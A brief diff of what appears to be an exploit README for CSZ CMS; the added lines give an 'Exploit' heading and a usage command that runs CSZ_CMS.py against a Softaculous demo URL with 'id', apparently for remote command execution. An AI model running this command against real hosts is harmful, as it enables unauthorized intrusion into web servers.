@@ -62,3 +62,6 @@
      templates
      test.php
      ```
+## Exploit:
+
+```python3 CSZ_CMS.py https://demos1.softaculous.com/CSZ_CMSladcjtgqrm/ id```
